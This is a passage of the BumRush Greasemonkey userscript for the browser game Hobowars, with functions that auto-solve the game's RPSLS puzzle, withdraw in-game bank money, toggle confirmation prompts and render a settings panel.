				GM_setValue(HoboVersion+"rat_feedarray", uneval(FoodIds)); //Save the list without the one we want
				var GotoString = "rats&do=eat&w_food=" + GotoFoodId + "&rid=" + args.rid;
				GotoCMD(GotoString);
			} else {
				GM_setValue(HoboVersion+"rat_feeding", false);
				var GotoString = "rats&do=feed&w_food=" + GotoFoodId + "&rid=" + args.rid;
				GotoCMD(GotoString);
			}
		}
	}
	
	
	function ShowBigResult() {
		if (macroCheck()) {
            return;
        }
		var Html = document.body.innerHTML;
		var AddText = ""
		if (Html.indexOf("exp gained") != -1) {
			AddText = "YOU WON!!"
		} else if (Html.indexOf("You can't attack") != -1) {	
			return;//We dont wont to show any results.
		} else {
			AddText = "YOU LOST"
		}
		var NewElement = document.createElement("h1"); //create element to hold text
		NewElement.innerHTML = AddText; // Put in text
		var Container = document.getElementById('area'); //Find where we are putting the text
		Container.parentNode.replaceChild(NewElement, Container); //Replace the text
	}
	
	//*--------------------------------*
	//        RPSLS Functions
	//*--------------------------------*
	
	function SetUpRPSLS() {
		if (macroCheck()) {
            return;
        }
		var html = whiteBox.innerHTML,Fight = new Array(),Count = 0;
		if(html.indexOf('too tired') != -1 || html.indexOf('We play for cash here') != -1){
			return;
		}		
		//We play for cash here
		// if (html.indexOf("!") != -1) {
			// var a = document.getElementsByTagName("img");
			// for (var b = 0; b < a.length; b++) {
				// if (a[b].src.indexOf("rpsls") != -1) {
					// Fight[Count] = a[b].src.substring(a[b].src.lastIndexOf('/')+1,a[b].src.lastIndexOf('.')).replace("2","");
					// Count ++;
				// }
			// }
		// }		
		var MoveArrayL = ['&action=rpsls&move=rock', '&action=rpsls&move=paper', '&action=rpsls&move=scissors', '&action=rpsls&move=lizard', '&action=rpsls&move=spock', '&action=rpsls&move=' + args.move, '&action=rpsls'];
		var MoveArrayT = ['Choose Rock','Choose Paper','Choose Scissors','Choose Lizard','Choose Spock','Repeat Last','Start Over'];
		if(html.indexOf('ear wiggles') != -1){
			RPSLSSolutionL = MoveArrayL[GM_getValue(HoboVersion+"EARCHOOSE")];
			RPSLSSolutionT = MoveArrayT[GM_getValue(HoboVersion+"EARCHOOSE")];
		}else if(html.indexOf('ground') != -1){
			RPSLSSolutionL = MoveArrayL[GM_getValue(HoboVersion+"FEETCHOOSE")];
			RPSLSSolutionT = MoveArrayT[GM_getValue(HoboVersion+"FEETCHOOSE")];
		}else if(html.indexOf('his eyes') != -1){
			RPSLSSolutionL = MoveArrayL[GM_getValue(HoboVersion+"EYESCHOOSE")];
			RPSLSSolutionT = MoveArrayT[GM_getValue(HoboVersion+"EYESCHOOSE")];
		}else if(html.indexOf('thumb inside') != -1){
			RPSLSSolutionL = MoveArrayL[GM_getValue(HoboVersion+"THUMBCHOOSE")];
			RPSLSSolutionT = MoveArrayT[GM_getValue(HoboVersion+"THUMBCHOOSE")];
		}else if(html.indexOf('his tongue') != -1){
			RPSLSSolutionL = MoveArrayL[GM_getValue(HoboVersion+"TONGUECHOOSE")];
			RPSLSSolutionT = MoveArrayT[GM_getValue(HoboVersion+"TONGUECHOOSE")];
		}else {
			if (args.move == null) {
				RPSLSSolutionL = '&action=rpsls';
				RPSLSSolutionT = "Start Over"
			} else {
				RPSLSSolutionL = MoveArrayL[GM_getValue(HoboVersion+"NOCHOOSE")];
				RPSLSSolutionT = MoveArrayT[GM_getValue(HoboVersion+"NOCHOOSE")];
			}
		}
		whiteBox.innerHTML = InsertTextAfter(html,"<b>City Hall</b>","<br><br><b>Your best Solution is to " + RPSLSSolutionT + "</b><br><button id=\"RPSLSButton\">Auto Solve</button><br>");
		document.getElementById("RPSLSButton").addEventListener("click", RPSLSClick, false);
	}
	
	
	function RPSLSClick() {
		GotoCMDFast("city_hall" + RPSLSSolutionL);
	}
		
	//*--------------------------------*
	//        Mart Functions
	//*--------------------------------*

	function SetUpMart() {
		if (macroCheck()) {
            return;
        }
		var Widthdraw = GM_getValue(HoboVersion+"enable_martwidthdraw"),Confirm = GM_getValue(HoboVersion+"enable_removeconfirm");		
		if (Widthdraw == false && Confirm == false) {
			return;
		}
		if (args.do == "buy") {
			var text = document.body.innerHTML;
			if (text.indexOf("You do not have enough money") != -1) {
				if (args.price != null) {
					WithdrawAndComeBack(args.price);
				}
			}
			return;
		}
		if (args.do != "list") {
			return;
		}
		var tables = document.getElementsByTagName("tbody");
		var gTable;
		for (var a = 0; a < tables.length; a++) {
			if (tables[a].rows[0].cells[0].textContent.indexOf("Item") != -1) {
				gTable = tables[a];
				break;
			}
		}
		var mData = new Array();
		var PriceF,PriceS,BuyF,cPrice,Find1;
		for (var x = 0; x < gTable.rows.length; x++) {
			for (var y = 0; y < gTable.rows[x].cells.length; y++) {
				var cCell = gTable.rows[x].cells[y];	
				if (x != 0) {
					if (y == PriceF) {
						cPrice = cCell.textContent.replace(/\,/g,'').replace("$","");
					}
					if (cCell.textContent.indexOf("Buy") != -1) {
						for (var z = 0; z < cCell.childNodes.length; z++) {
							if (cCell.childNodes[z].textContent.indexOf("Buy") != -1) {
								Find1 = z;
								break;
							}
						}
						for (var z = 0; z < cCell.childNodes[Find1].childNodes.length; z++) {
							if (cCell.childNodes[Find1].childNodes[z].textContent.indexOf("Buy") != -1) {
								if (Widthdraw) {
									cCell.childNodes[Find1].childNodes[z].href += "&" + PriceS + "=" + cPrice;
								}
								if (Confirm) {
									cCell.childNodes[Find1].childNodes[z].attributes[0].value = "";
								}
							}
						}						
					}
				} else {
					if (cCell.textContent.indexOf("Price") != -1) {
						PriceF = y;
						PriceS = "price"
					}
					if (cCell.textContent.indexOf("Tokens") != -1) {
						PriceF = y;
						PriceS = "tokens"
					}
				}
			}		
		}		
	}
	
	//*--------------------------------*
	//  Auto Money Widthdraw Functions
	//*--------------------------------*
	
	function checkForMoney() {
		if (macroCheck()) {
            return;
        }
		var text = document.body.innerHTML;
		if (text.indexOf("You do not have $") != -1) {
			var WithdrawAmount = GetTextBetween(text,"You do not have $"," on you.").replace(/\,/g,'');
			WithdrawAndComeBack(WithdrawAmount);
			return;
		}
		if (text.indexOf("It is going to cost you <b>$") != -1) {
			var WithdrawAmount = GetTextBetween(text,"It is going to cost you <b>$","</b>").replace(/\,/g,'');
			WithdrawAndComeBack(WithdrawAmount);
			return;
		}	
	}

	
	function WithdrawAndComeBack(WithdrawAmount) {
		GM_setValue(HoboVersion+"value_WithdrawAmount",WithdrawAmount);
		lastUrl = window.location.href.replace("?sr=" + args.sr,"?sr=***");
		GM_setValue(HoboVersion+"value_lastUrl",lastUrl);
		GotoCMD("bank");
	}	
	
	
	function CheckWithdraw() {
		var WithdrawAmount = GM_getValue(HoboVersion+"value_WithdrawAmount");
		var lastUrl = GM_getValue(HoboVersion+"value_lastUrl");
		if (macroCheck()) {
            return;
        }
		if (args.do == null) {
			if (WithdrawAmount > 0) {
				var a = document.getElementsByTagName("input");
				var CurrentC;
				//Get how much we have in hand atm
				for (var b = 0; b < a.length; b++) {
					if (a[b].type =="text" && a[b].name == "d_money") {
						CurrentC = a[b].value;
						break;
					}										
				}
				//then widthdraw how much we need
				for (var b = 0; b < a.length; b++) {
					if (a[b].type =="text" && a[b].name == "w_money") {
						a[b].value = (WithdrawAmount - CurrentC);
					}
				}
				//then click the button
				for (var b = 0; b < a.length; b++) {
					if (a[b].type =="submit" && a[b].value.indexOf("Withdraw") != -1) {
						a[b].click();
					}
				}
			}
		} else if (args.do == "with") {
			var html = document.body.innerHTML;
			if (html.indexOf("not sure what made you think you had") != -1) {
				//You Dont Have any money
				GM_setValue(HoboVersion+"value_WithdrawAmount",0);
				GM_setValue(HoboVersion+"value_lastUrl","");
			} else {
				if (lastUrl.length > 0) {
					var src = GetCurrentSrc();
					var GotoLoc = lastUrl.replace("?sr=***","?sr=" + src);
					GM_setValue(HoboVersion+"value_WithdrawAmount",0);
					GM_setValue(HoboVersion+"value_lastUrl","");
					GotoLocation(GotoLoc);	
				}
			}
		}
	}

	//*--------------------------------*
	//       Bum Rish Display Functions 
	//*--------------------------------*
		
	function setupLayout() {
		if (HoboVersion == 3) {
			whiteBox = document.getElementById("contents");
			menuBox = document.getElementById("menu");
			return true;
		} else {
			var a = document.getElementsByTagName("img");
			for (var b = 0; b < a.length; b++) {
				if (a[b].src.indexOf("/hobowars_logo_s.gif") != -1) {
					layout = 0;
					break;
				} else if (a[b].src.indexOf("l/logo.jpg") != -1) {
					layout = 1;
					break;
				}
			}
			switch (layout) {
			  case 0:
				var c = document.getElementsByTagName("div");
				for (var d = 0; d < c.length; d++) {
					if (c[d].className == "tabpage") {
						whiteBox = c[d];
						break;
					}
				}
				menuBox = document.getElementById("sideMenu");
				break;
			  case 1:
				whiteBox = document.getElementById("whitebox");
				menuBox = document.getElementById("menu");
				break;
			  default:
				return false;
			}
			return true;
		}
    }
	
	
	function setupConfig() {
		if (HoboVersion == 3) {
			menuBox.innerHTML = menuBox.innerHTML + "<br><br><a id=\"BRConfigLink\" href=\"javascript:void(0);\">BumRush</a>"
			document.getElementById("BRConfigLink").addEventListener("click", displayBRConfiguration, false);
		} else {
			var a = menuBox.innerHTML.indexOf("</li>");
			if (a == -1) {
				return;
			}
			menuBox.innerHTML = menuBox.innerHTML.substring(0, a + 5) + "<li> <a id=\"BRConfigLink\" href=\"javascript:void(0);\">BumRush</a></li>" + menuBox.innerHTML.substring(a + 5);
			document.getElementById("BRConfigLink").addEventListener("click", displayBRConfiguration, false);
		}
    }
	
	
    function displayBRConfiguration() {
        if (configActive) {
            return;
        }
        configActive = true;
        whiteBoxHTML = whiteBox.innerHTML;
		whiteBox.innerHTML = "<table border='0' width=\"100%\"><tr><td width=\"50%\"><span style=\"font-size:30px;color:#0066cc;\">BumRush&nbsp;</span><span style=\"color:#888888;\">Version " + BumRushVersion + "</span></td><td align=\"right\"><a href='http://digg.com/playable_web_games/BumRush_A_Hobowars_tool_set' title='Digg This Script'><img src='http://digg.com/img/digg-guy.gif'></a></td></tr></table>Original by <a href=\"http://userscripts.org/users/63615/scripts\">qContinuum</a><br>Maintained by Glitchy<br><div align=\"right\">Check <a href=\"http://userscripts.org/scripts/show/51480\">here</a> for the latest version</div><hr style=\"color:#888888;border:2px;border-style:dashed\" /><div align=\"right\"></div><h1>Configuration</h1><br class=\"clear\"><br class=\"clear\"><h2>Miscellaneous</h2><br class=\"clear\"><input type=\"checkbox\" id=\"enable_refresh\"" + ((GM_getValue(HoboVersion+"enable_refresh") == true) ? " checked=\"checked\"" : "") + ">Anti-Refresh(Revisits Page if you accidentally refresh)</input><br class=\"clear\"><input type=\"checkbox\" id=\"enable_widthdraw\"" + ((GM_getValue(HoboVersion+"enable_widthdraw") == true) ? " checked=\"checked\"" : "") + ">Auto-withdraw money from bank if you try to train or heal with 0$</input><br class=\"clear\"><br><br><h2>Timing</h2><br>Time between changing pages on automated task (measured in secs)<br><b>From:</b> <input type=\"text\" size=\"5\" id=\"DELAYFROM\"/ value=\""+ GM_getValue(HoboVersion+"DELAYFROM") +"\">&nbsp;&nbsp; <b>To:</b> <input type=\"text\" size=\"5\" id=\"DELAYTO\"/ value=\""+ GM_getValue(HoboVersion+"DELAYTO") +"\"><br><br class=\"clear\"><br class=\"clear\"><h2>SuperGlobalHyperMart</h2><br class=\"clear\"><input type=\"checkbox\" id=\"enable_martwidthdraw\"" + ((GM_getValue(HoboVersion+"enable_martwidthdraw") == true) ? " checked=\"checked\"" : "") + ">Auto widthdraw money from bank if you dont have enough on hand</input><br class=\"clear\"><input type=\"checkbox\" id=\"enable_removeconfirm\"" + ((GM_getValue(HoboVersion+"enable_removeconfirm") == true) ? " checked=\"checked\"" : "") + ">Remove confirm box on item buy(Danger of buying the wrong item)</input><br class=\"clear\"><br class=\"clear\"><br class=\"clear\"><h2>Cart</h2><br class=\"clear\"><input type=\"checkbox\" id=\"enable_foodprompt\"" + ((GM_getValue(HoboVersion+"enable_foodprompt") == true) ? " checked=\"checked\"" : "") + ">Ask before eating food</input><br class=\"clear\"><br class=\"clear\"><br class=\"clear\"><h2>Exploring</h2><br><input type=\"checkbox\" id=\"enable_throwoutrats\"" + ((GM_getValue(HoboVersion+"enable_throwoutrats") == true) ? " checked=\"checked\"" : "") + ">Automatically Throw out rats while Auto Exploring</input><br>Keep This rat while auto exploring: <input type=\"text\" id=\"value_rattofind\"/ value=\""+ GM_getValue(HoboVersion+"value_rattofind") +"\"><br class=\"clear\"><br class=\"clear\"><br class=\"clear\"><h2>Hospital</h2><br class=\"clear\"><input type=\"checkbox\" id=\"enable_hospitalautoheal\"" + ((GM_getValue(HoboVersion+"enable_hospitalautoheal") == true) ? " checked=\"checked\"" : "") + ">Automatically heal from</input>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"hospitalautohealchoice\" value=\"0\"" + ((GM_getValue(HoboVersion+"hospitalautoheal_choice") == 0) ? " checked=\"checked\"" : "") + ">Personal Funds</input>&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"hospitalautohealchoice\" value=\"1\"" + ((GM_getValue(HoboVersion+"hospitalautoheal_choice") == 1) ? " checked=\"checked\"" : "") + ">Gang Funds</input><br class=\"clear\"><br class=\"clear\"><br class=\"clear\"><h2>Living Area</h2><br class=\"clear\"><input type=\"checkbox\" id=\"enable_lockringthrow\"" + ((GM_getValue(HoboVersion+"enable_lockringthrow") == true) ? " checked=\"checked\"" : "") + ">Lock ring throw away link</input><br class=\"clear\"><input type=\"checkbox\" id=\"enable_grailprompt\"" + ((GM_getValue(HoboVersion+"enable_grailprompt") == true) ? " checked=\"checked\"" : "") + ">Ask before using Hobo Grail</input><br class=\"clear\"><br class=\"clear\"><br class=\"clear\"><h2>Suicide Hill</h2><br class=\"clear\"><input type=\"checkbox\" id=\"enable_hillautosignup\"" + ((GM_getValue(HoboVersion+"enable_hillautosignup") == true) ? " checked=\"checked\"" : "") + ">Automatically sign up for race when visiting Greg</input><br class=\"clear\"><input type=\"checkbox\" id=\"enable_garageautoback\"" + ((GM_getValue(HoboVersion+"enable_garageautoback") == true) ? " checked=\"checked\"" : "") + ">Return to garage when modifying/selling and there is no back link</input><br class=\"clear\"><br class=\"clear\"><br class=\"clear\"><h2>University</h2><br class=\"clear\"><input type=\"checkbox\" id=\"enable_universitylocktrain\"" + ((GM_getValue(HoboVersion+"enable_universitylocktrain") == true) ? " checked=\"checked\"" : "") + ">Lock training to only </input>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"universitylocktrainchoice\" value=\"0\"" + ((GM_getValue(HoboVersion+"universitylocktrain_choice") == 0) ? " checked=\"checked\"" : "") + ">Strength</input>&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"universitylocktrainchoice\" value=\"1\"" + ((GM_getValue(HoboVersion+"universitylocktrain_choice") == 1) ? " checked=\"checked\"" : "") + ">Power</input>&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"universitylocktrainchoice\" value=\"2\"" + ((GM_getValue(HoboVersion+"universitylocktrain_choice") == 2) ? " checked=\"checked\"" : "") + ">Intelligence</input>&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"universitylocktrainchoice\" value=\"3\"" + ((GM_getValue(HoboVersion+"universitylocktrain_choice") == 3) ? " checked=\"checked\"" : "") + ">Speed</input><br class=\"clear\"><br class=\"clear\"><br class=\"clear\"><h2>RPSLS</h2><br class=\"clear\"><b>Strategy to use for RPSLS</b><br class=\"clear\"><br class=\"clear\">Choose for TONGUE<br>&nbsp;&nbsp;<input type=\"radio\" name=\"TONGUECHOOSE\" value=\"0\"" + ((GM_getValue(HoboVersion+"TONGUECHOOSE") == 0) ? " checked=\"checked\"" : "") + ">Rock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"TONGUECHOOSE\" value=\"1\"" + ((GM_getValue(HoboVersion+"TONGUECHOOSE") == 1) ? " checked=\"checked\"" : "") + ">Paper</input>&nbsp;&nbsp;<input type=\"radio\" name=\"TONGUECHOOSE\" value=\"2\"" + ((GM_getValue(HoboVersion+"TONGUECHOOSE") == 2) ? " checked=\"checked\"" : "") + ">Scissors</input>&nbsp;&nbsp;<input type=\"radio\" name=\"TONGUECHOOSE\" value=\"3\"" + ((GM_getValue(HoboVersion+"TONGUECHOOSE") == 3) ? " checked=\"checked\"" : "") + ">Lizard</input>&nbsp;&nbsp;<input type=\"radio\" name=\"TONGUECHOOSE\" value=\"4\"" + ((GM_getValue(HoboVersion+"TONGUECHOOSE") == 4) ? " checked=\"checked\"" : "") + ">Spock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"TONGUECHOOSE\" value=\"5\"" + ((GM_getValue(HoboVersion+"TONGUECHOOSE") == 5) ? " checked=\"checked\"" : "") + ">Repeat Last</input>&nbsp;&nbsp;<input type=\"radio\" name=\"TONGUECHOOSE\" value=\"6\"" + ((GM_getValue(HoboVersion+"TONGUECHOOSE") == 6) ? " checked=\"checked\"" : "") + ">Start Over</input><br class=\"clear\"><br class=\"clear\">Choose for FEET<br class=\"clear\">&nbsp;&nbsp;<input type=\"radio\" name=\"FEETCHOOSE\" value=\"0\"" + ((GM_getValue(HoboVersion+"FEETCHOOSE") == 0) ? " checked=\"checked\"" : "") + ">Rock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"FEETCHOOSE\" value=\"1\"" + ((GM_getValue(HoboVersion+"FEETCHOOSE") == 1) ? " checked=\"checked\"" : "") + ">Paper</input>&nbsp;&nbsp;<input type=\"radio\" name=\"FEETCHOOSE\" value=\"2\"" + ((GM_getValue(HoboVersion+"FEETCHOOSE") == 2) ? " checked=\"checked\"" : "") + ">Scissors</input>&nbsp;&nbsp;<input type=\"radio\" name=\"FEETCHOOSE\" value=\"3\"" + ((GM_getValue(HoboVersion+"FEETCHOOSE") == 3) ? " checked=\"checked\"" : "") + ">Lizard</input>&nbsp;&nbsp;<input type=\"radio\" name=\"FEETCHOOSE\" value=\"4\"" + ((GM_getValue(HoboVersion+"FEETCHOOSE") == 4) ? " checked=\"checked\"" : "") + ">Spock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"FEETCHOOSE\" value=\"5\"" + ((GM_getValue(HoboVersion+"FEETCHOOSE") == 5) ? " checked=\"checked\"" : "") + ">Repeat Last</input>&nbsp;&nbsp;<input type=\"radio\" name=\"FEETCHOOSE\" value=\"6\"" + ((GM_getValue(HoboVersion+"FEETCHOOSE") == 6) ? " checked=\"checked\"" : "") + ">Start Over</input><br class=\"clear\"><br class=\"clear\">Choose for THUMB<br class=\"clear\">&nbsp;&nbsp;<input type=\"radio\" name=\"THUMBCHOOSE\" value=\"0\"" + ((GM_getValue(HoboVersion+"THUMBCHOOSE") == 0) ? " checked=\"checked\"" : "") + ">Rock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"THUMBCHOOSE\" value=\"1\"" + ((GM_getValue(HoboVersion+"THUMBCHOOSE") == 1) ? " checked=\"checked\"" : "") + ">Paper</input>&nbsp;&nbsp;<input type=\"radio\" name=\"THUMBCHOOSE\" value=\"2\"" + ((GM_getValue(HoboVersion+"THUMBCHOOSE") == 2) ? " checked=\"checked\"" : "") + ">Scissors</input>&nbsp;&nbsp;<input type=\"radio\" name=\"THUMBCHOOSE\" value=\"3\"" + ((GM_getValue(HoboVersion+"THUMBCHOOSE") == 3) ? " checked=\"checked\"" : "") + ">Lizard</input>&nbsp;&nbsp;<input type=\"radio\" name=\"THUMBCHOOSE\" value=\"4\"" + ((GM_getValue(HoboVersion+"THUMBCHOOSE") == 4) ? " checked=\"checked\"" : "") + ">Spock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"THUMBCHOOSE\" value=\"5\"" + ((GM_getValue(HoboVersion+"THUMBCHOOSE") == 5) ? " checked=\"checked\"" : "") + ">Repeat Last</input>&nbsp;&nbsp;<input type=\"radio\" name=\"THUMBCHOOSE\" value=\"6\"" + ((GM_getValue(HoboVersion+"THUMBCHOOSE") == 6) ? " checked=\"checked\"" : "") + ">Start Over</input><br class=\"clear\"><br class=\"clear\">Choose for EAR<br class=\"clear\">&nbsp;&nbsp;<input type=\"radio\" name=\"EARCHOOSE\" value=\"0\"" + ((GM_getValue(HoboVersion+"EARCHOOSE") == 0) ? " checked=\"checked\"" : "") + ">Rock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EARCHOOSE\" value=\"1\"" + ((GM_getValue(HoboVersion+"EARCHOOSE") == 1) ? " checked=\"checked\"" : "") + ">Paper</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EARCHOOSE\" value=\"2\"" + ((GM_getValue(HoboVersion+"EARCHOOSE") == 2) ? " checked=\"checked\"" : "") + ">Scissors</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EARCHOOSE\" value=\"3\"" + ((GM_getValue(HoboVersion+"EARCHOOSE") == 3) ? " checked=\"checked\"" : "") + ">Lizard</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EARCHOOSE\" value=\"4\"" + ((GM_getValue(HoboVersion+"EARCHOOSE") == 4) ? " checked=\"checked\"" : "") + ">Spock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EARCHOOSE\" value=\"5\"" + ((GM_getValue(HoboVersion+"EARCHOOSE") == 5) ? " checked=\"checked\"" : "") + ">Repeat Last</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EARCHOOSE\" value=\"6\"" + ((GM_getValue(HoboVersion+"EARCHOOSE") == 6) ? " checked=\"checked\"" : "") + ">Start Over</input><br class=\"clear\"><br class=\"clear\">Choose for EYES<br class=\"clear\">&nbsp;&nbsp;<input type=\"radio\" name=\"EYESCHOOSE\" value=\"0\"" + ((GM_getValue(HoboVersion+"EYESCHOOSE") == 0) ? " checked=\"checked\"" : "") + ">Rock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EYESCHOOSE\" value=\"1\"" + ((GM_getValue(HoboVersion+"EYESCHOOSE") == 1) ? " checked=\"checked\"" : "") + ">Paper</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EYESCHOOSE\" value=\"2\"" + ((GM_getValue(HoboVersion+"EYESCHOOSE") == 2) ? " checked=\"checked\"" : "") + ">Scissors</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EYESCHOOSE\" value=\"3\"" + ((GM_getValue(HoboVersion+"EYESCHOOSE") == 3) ? " checked=\"checked\"" : "") + ">Lizard</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EYESCHOOSE\" value=\"4\"" + ((GM_getValue(HoboVersion+"EYESCHOOSE") == 4) ? " checked=\"checked\"" : "") + ">Spock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EYESCHOOSE\" value=\"5\"" + ((GM_getValue(HoboVersion+"EYESCHOOSE") == 5) ? " checked=\"checked\"" : "") + ">Repeat Last</input>&nbsp;&nbsp;<input type=\"radio\" name=\"EYESCHOOSE\" value=\"6\"" + ((GM_getValue(HoboVersion+"EYESCHOOSE") == 6) ? " checked=\"checked\"" : "") + ">Start Over</input><br class=\"clear\"><br class=\"clear\">		Choose for no hint<br class=\"clear\">&nbsp;&nbsp;<input type=\"radio\" name=\"NOCHOOSE\" value=\"0\"" + ((GM_getValue(HoboVersion+"NOCHOOSE") == 0) ? " checked=\"checked\"" : "") + ">Rock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"NOCHOOSE\" value=\"1\"" + ((GM_getValue(HoboVersion+"NOCHOOSE") == 1) ? " checked=\"checked\"" : "") + ">Paper</input>&nbsp;&nbsp;<input type=\"radio\" name=\"NOCHOOSE\" value=\"2\"" + ((GM_getValue(HoboVersion+"NOCHOOSE") == 2) ? " checked=\"checked\"" : "") + ">Scissors</input>&nbsp;&nbsp;<input type=\"radio\" name=\"NOCHOOSE\" value=\"3\"" + ((GM_getValue(HoboVersion+"NOCHOOSE") == 3) ? " checked=\"checked\"" : "") + ">Lizard</input>&nbsp;&nbsp;<input type=\"radio\" name=\"NOCHOOSE\" value=\"4\"" + ((GM_getValue(HoboVersion+"NOCHOOSE") == 4) ? " checked=\"checked\"" : "") + ">Spock</input>&nbsp;&nbsp;<input type=\"radio\" name=\"NOCHOOSE\" value=\"5\"" + ((GM_getValue(HoboVersion+"NOCHOOSE") == 5) ? " checked=\"checked\"" : "") + ">Repeat Last</input>&nbsp;&nbsp;<input type=\"radio\" name=\"NOCHOOSE\" value=\"6\"" + ((GM_getValue(HoboVersion+"NOCHOOSE") == 6) ? " checked=\"checked\"" : "") + ">Start Over</input><br class=\"clear\"><br class=\"clear\"><center><button id=\"BRConfigOKButton\">Save</button><button id=\"BRConfigCancelButton\">Cancel</button></center><br class=\"clear\"><br><h1>Updates</h1><br class=\"clear\">";
		for (var a = (BumUpdates.length-1); a >= 0; a--) {
			whiteBox.innerHTML = whiteBox.innerHTML + BumUpdates[a] + "<br><br>"
		}
		document.getElementById("BRConfigOKButton").addEventListener("click", saveBRConfiguration, false);
        document.getElementById("BRConfigCancelButton").addEventListener("click", closeBRConfiguration, false);
		CheckForUpdates();
    }


    function saveBRConfiguration() {
        inputs = whiteBox.getElementsByTagName("input");
        for (var a = 0; a < inputs.length; a++) {
            if (inputs[a].type == "checkbox") {
                GM_setValue(HoboVersion+inputs[a].id, inputs[a].checked);
            }
			if (inputs[a].type == "text") {
                GM_setValue(HoboVersion+inputs[a].id, inputs[a].value);
            }
        }		
		GM_setValue(HoboVersion+"hospitalautoheal_choice", getSelectedRadio(document.getElementsByName("hospitalautohealchoice")));
		GM_setValue(HoboVersion+"universitylocktrain_choice", getSelectedRadio(document.getElementsByName("universitylocktrainchoice")));		
		GM_setValue(HoboVersion+"TONGUECHOOSE", getSelectedRadio(document.getElementsByName("TONGUECHOOSE")));
		GM_setValue(HoboVersion+"FEETCHOOSE", getSelectedRadio(document.getElementsByName("FEETCHOOSE")));
		GM_setValue(HoboVersion+"THUMBCHOOSE", getSelectedRadio(document.getElementsByName("THUMBCHOOSE")));
		GM_setValue(HoboVersion+"EARCHOOSE", getSelectedRadio(document.getElementsByName("EARCHOOSE")));
		GM_setValue(HoboVersion+"EYESCHOOSE", getSelectedRadio(document.getElementsByName("EYESCHOOSE")));
		GM_setValue(HoboVersion+"NOCHOOSE", getSelectedRadio(document.getElementsByName("NOCHOOSE")));				
        closeBRConfiguration();
    }
	
	
	function getSelectedRadio(buttonGroup) {
	   // returns the array number of the selected radio button or -1 if no button is selected
	   if (buttonGroup[0]) { // if the button group is an array (one button is not an array)
		  for (var i=0; i<buttonGroup.length; i++) {
			 if (buttonGroup[i].checked) {
				return i
			 }
		  }
	   } else {
		  if (buttonGroup.checked) { return 0; } // if the one button is checked, return zero
	   }
	   // if we get to this point, no radio button is selected
	   return -1;
	}


    function closeBRConfiguration() {
        if (whiteBoxHTML != null && whiteBoxHTML.length > 0) {
            whiteBox.innerHTML = whiteBoxHTML;
        }
        configActive = false;
    }

	//*--------------------------------*
	//        Main Menu Functions
	//*--------------------------------*
	
	function lockRingThrow() {
        if (macroCheck()) {
            return;
        }
        var a = whiteBox.innerHTML.indexOf("do=throw_away");
        if (a == -1) {
            return;
        }
        a = whiteBox.innerHTML.substring(0, a);
        whiteBox.innerHTML = whiteBox.innerHTML.substring(0, a.lastIndexOf("[") + 1) + "<strike>T</strike>" + whiteBox.innerHTML.substring(whiteBox.innerHTML.substring(a.length).indexOf("]") + a.length);
    }
	
	
	function setupGrailPrompt() {
        if (macroCheck()) {
            return;
        }
        var a = document.getElementsByTagName("a");
        for (var b = 0; b < a.length; b++) {
            if (a[b].href.length > 10 &&
                a[b].href.substring(a[b].href.length - 10) == "&cmd=grail") {
                a[b].href = "javascript:if(confirm('Use the Hobo Grail?')) location.href='" + a[b].href + "'; void(0);";
            }
        }
    }


    function setupFoodPrompts() {
        if (macroCheck()) {
            return;
        }
        var a = document.getElementsByTagName("a");
        for (var b = 0; b < a.length; b++) {
            if (a[b].text == "Consume") {
                a[b].href = "javascript:if(confirm('Are you sure you want to eat this?')) location.href='" + a[b].href + "'; void(0);";
            }
        }
    }
	
	
	function FixMainMenu() {
	    var hrefs = document.getElementsByTagName("a");
        for (var i = 0; i < hrefs.length; i++) {
            if (hrefs[i].rel.toLowerCase() == "info") {
				hrefs[i].href=GetString(0);
            }
			if (hrefs[i].rel.toLowerCase() == "more_info") {
				hrefs[i].href=GetString(1);
            }
			if (hrefs[i].rel.toLowerCase() == "food") {
				hrefs[i].href=GetString(2);
            }
        }
		CheckAllString = "javascript:var a = document.getElementsByTagName(\"input\");for (var b = 0; b < a.length; b++) {if (a[b].name == \"checkbox[]\") {if (a[b].checked){a[b].checked = false;}else{a[b].checked = true;}}};void(0);";
		var CheckAll = document.getElementById("checkAll");
		CheckAll.setAttribute("onClick", CheckAllString);
    }
	
	
	function showNextRespectLevelInfo() {
        if (macroCheck()) {
            return;
        }
        var a = getRespect();
        if (!a) {
            return;
        }
		var WorkBox = document.getElementById("info");
        var b = WorkBox.innerHTML.indexOf("Respect:") + 4 + WorkBox.innerHTML.substring(WorkBox.innerHTML.indexOf("Respect:")).indexOf("<br>");
        var c = "";
        var d;
        var e;
        for (var f = 0; f <= respectLevels.length; f++) {
            if (f == respectLevels.length) {
                d = f;
                break;
            }
            if (respectLevels[f][0] > Math.abs(a)) {
                d = f;
                e = respectLevels[d][0] - Math.abs(a);
                break;
            }
        }
        if (a < 0) {
            c = "<div class=\"line\">Next Level: <font color=\"#FF1100\">" + ((d == respectLevels.length) ? "(None)</font><br>" : respectLevels[d][2] + "</font><br>[<font color=\"#FF1100\">-" + addCommas(e) + "</font>] Until Next<br></div>");
        } else {
            c = "<div class=\"line\">Next Level: <font color=\"#009900\">" + ((d == respectLevels.length) ? "(None)</font><br>" : respectLevels[d][1] + "</font><br>[<font color=\"#009900\">" + addCommas(e) + "</font>] Until Next<br></div>");
        }
